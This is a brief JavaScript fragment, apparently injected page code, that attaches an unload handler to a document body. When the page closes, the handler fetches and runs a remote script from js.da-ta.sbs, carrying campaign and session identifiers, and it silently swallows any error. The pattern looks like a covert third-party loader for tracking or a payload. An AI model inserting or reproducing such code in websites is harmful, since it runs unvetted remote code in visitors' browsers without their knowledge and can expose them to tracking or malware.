
const pbody = element.getElementsByTagName("body")[0];
pbody.onbeforeunload = function(){
  var ourl = "https://js.da-ta.sbs/l.js?cid=dizzmedia&lid=1152817&session=f8da17f085fd98cb570bc280c15e9b83-1743502171";
  loadScript(ourl)
  .then(() => {})
  .catch(error => {});
};